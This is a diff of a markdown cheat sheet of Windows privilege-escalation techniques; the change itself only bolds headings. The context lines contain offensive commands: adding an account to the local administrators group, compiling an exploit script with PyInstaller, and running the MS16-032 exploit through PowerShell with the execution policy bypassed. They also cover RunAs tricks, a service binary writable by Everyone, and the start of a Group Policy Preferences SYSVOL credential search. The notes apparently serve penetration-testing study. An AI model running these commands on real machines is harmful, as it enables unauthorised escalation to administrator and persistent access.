@@ -12,7 +12,7 @@ net localgroup administrators IWAM_BOB /add
 
 ***
 
-* Python Complier exe
+* **Python Complier exe**
 
 ```
  pip install pyinstaller
@@ -20,13 +20,13 @@ net localgroup administrators IWAM_BOB /add
  python pyinstaller.py --onefile exploit.py
 ```
 
-* Powershell exploit run in cmd
+* **Powershell exploit run in cmd**
 
 ```
 powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 ```
 
-* Windows Run As
+* **Windows Run As**
 
 1 - Sysinternal psexec
 
@@ -57,7 +57,7 @@ To start:
 powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
 
-* Windows Service Configuration Viewver:
+* **Windows Service Configuration Viewver:**
 
 ```
  scsiaccess.exe  
@@ -68,7 +68,7 @@ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRun
  Everyone:(I)(F)
 ```
 
-* Group Policy Preferences
+* **Group Policy Preferences**
 
 ```
 #map the Domain controller SYSVOL share
